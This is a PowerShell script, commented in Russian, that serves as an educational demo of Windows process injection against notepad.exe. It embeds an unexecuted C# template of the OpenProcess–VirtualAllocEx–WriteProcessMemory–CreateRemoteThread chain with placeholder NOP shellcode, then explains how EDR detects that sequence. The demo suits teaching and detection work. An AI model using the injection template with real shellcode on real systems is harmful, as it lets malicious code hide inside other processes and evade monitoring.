# РЕАЛЬНАЯ ДЕМОНСТРАЦИЯ PROCESS INJECTION (образовательная)
function Show-RealInjectionDemo {
    Write-Host "=== РЕАЛЬНЫЙ PROCESS INJECTION ===" -ForegroundColor Cyan
    Write-Host "Цель: внедрить код в процесс notepad.exe" -ForegroundColor Yellow
    
    try {
        # Запускаем целевой процесс
        $notepad = Start-Process notepad -PassThru -WindowStyle Minimized
        Start-Sleep -Seconds 2
        
        Write-Host "[1] Целевой процесс: $($notepad.ProcessName) (PID: $($notepad.Id))" -ForegroundColor Green
        
        # Вот как выглядит РЕАЛЬНЫЙ injection код (не выполняем его!):
        $injectionCode = @"
using System;
using System.Runtime.InteropServices;

public class RealInjection {
    // ОПАСНЫЕ API-вызовы для injection
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    
    public static void InjectIntoProcess(int targetPid) {
        // 1. Открываем handle к целевому процессу
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
        
        // 2. Выделяем память в целевом процессе
        IntPtr allocatedMem = VirtualAllocEx(hProcess, IntPtr.Zero, 1024, 0x3000, 0x40);
        
        // 3. Записываем shellcode в память целевого процесса
        byte[] shellcode = new byte[] { 
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        }; // NOP sled (заглушка)
        
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocatedMem, shellcode, (uint)shellcode.Length, out bytesWritten);
        
        // 4. Запускаем поток в целевом процессе
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMem, IntPtr.Zero, 0, IntPtr.Zero);
        
        Console.WriteLine("Injection completed!");
    }
}
"@

        Write-Host "[2] Код для реального injection (заблокирован антивирусом):" -ForegroundColor Red
        Write-Host "    - OpenProcess() → VirtualAllocEx() → WriteProcessMemory() → CreateRemoteThread()" -ForegroundColor Yellow
        Write-Host "    - Эта последовательность - главный триггер для EDR!" -ForegroundColor Red
        
        Write-Host "`n[3] Что делает EDR при обнаружении:" -ForegroundColor Cyan
        Write-Host "    ✓ Мониторит API-вызовы в реальном времени" -ForegroundColor Yellow
        Write-Host "    ✓ Анализирует цепочки вызовов процессов" -ForegroundColor Yellow
        Write-Host "    ✓ Блокирует подозрительные операции с памятью" -ForegroundColor Yellow
        Write-Host "    ✓ Отправляет алерты в SOC" -ForegroundColor Yellow
        
        # Завершаем демонстрационный процесс
        $notepad.Kill()
        Write-Host "`n[+] Демонстрационный процесс завершен" -ForegroundColor Green
        
    } catch {
        Write-Host "[ОШИБКА] $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Запускаем демонстрацию
Show-RealInjectionDemo
